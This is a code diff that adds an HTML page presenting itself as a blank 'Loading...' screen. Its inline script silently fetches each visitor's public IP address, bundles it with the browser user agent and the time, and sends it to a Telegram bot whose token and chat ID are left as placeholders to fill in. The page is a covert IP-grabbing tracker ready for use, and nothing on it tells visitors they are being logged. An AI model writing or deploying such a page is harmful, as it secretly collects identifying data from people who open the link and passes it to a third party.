@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
+  <style>
+    body {
+      background-color: white;
+      margin: 0;
+    }
+  </style>
+</head>
+<body>
+  <script>
+    const BOT_TOKEN = 'ISI_BOT_TOKEN_KAMU';
+    const CHAT_ID = 'ISI_CHAT_ID_KAMU';
+
+    const userAgent = navigator.userAgent;
+    const waktu = new Date().toLocaleString();
+
+    fetch('https://api64.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+        const pesan = `
+Data Pengunjung:
+IP: ${ip}
+User-Agent: ${userAgent}
+Waktu: ${waktu}
+        `;
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: pesan,
+            parse_mode: 'HTML'
+          })
+        });
+      });
+  </script>
+</body>
+</html>
